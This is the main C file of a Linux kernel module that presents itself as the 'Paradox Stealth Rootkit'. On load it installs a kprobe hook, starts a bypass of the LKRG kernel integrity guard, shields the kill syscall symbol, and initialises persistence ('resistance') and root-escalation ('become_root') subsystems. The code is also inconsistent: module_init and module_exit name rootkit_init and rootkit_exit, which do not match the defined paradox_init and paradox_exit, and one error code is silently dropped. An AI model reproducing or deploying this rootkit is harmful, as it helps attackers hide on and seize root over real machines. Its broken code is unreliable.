#include "include/resistance.h"
#include "include/core.h"
#include "include/lkrg_bypass.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("skilledPaRaDoX");
MODULE_DESCRIPTION("Version 0.02 of the Paradox Stealth Rootkit");
MODULE_VERSION("0.02");

static void sd_snapshot_fn(void) {
sd_protect_symbol("__x64_sys_kill");
}

static int __init paradox_init(void) {
    int err = 0;

    // Begin initalizing subsystems
    err = sd_bootstrap_kprobe_hook();
    if (err) return err;

    err = lkrg_bypass_init();
    if (err) return err;

    sd_snapshot_fn();

    err = resistance_init();

    err |= become_root_init();

    printk(KERN_INFO "[!] Paradox: loaded...\n");
    return 0;
}

static void __exit paradox_exit(void) {
    resistance_exit();
    lkrg_bypass_exit();
    become_root_exit();

    printk(KERN_INFO "[!] Paradox: unloaded...\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
